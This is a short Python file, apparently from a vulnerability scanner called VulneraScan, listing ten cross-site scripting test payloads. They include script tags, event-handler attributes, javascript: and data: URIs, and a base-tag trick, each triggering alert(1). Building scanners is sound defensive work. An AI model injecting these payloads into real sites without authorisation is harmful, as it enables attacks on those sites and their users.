# XSS payloads for VulneraScan
# Cross-Site Scripting (XSS) Payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",                          # Basic alert
    "<img src=x onerror=alert(1)>",                       # Image error
    "<svg onload=alert(1)>",                              # SVG
    "<input autofocus onfocus=alert(1)>",                 # Input field
    "<div onmouseover=alert(1)>hover</div>",              # Mouseover
    "<iframe src=javascript:alert(1)></iframe>",          # Iframe JS
    "javascript:alert(1)",                                # Protocol
    "data:text/html,<script>alert(1)</script>",           # Data URI
    "#<script>alert(1)</script>",                         # Fragment
    "<base href='javascript:alert(1)//'>",                # Base tag
]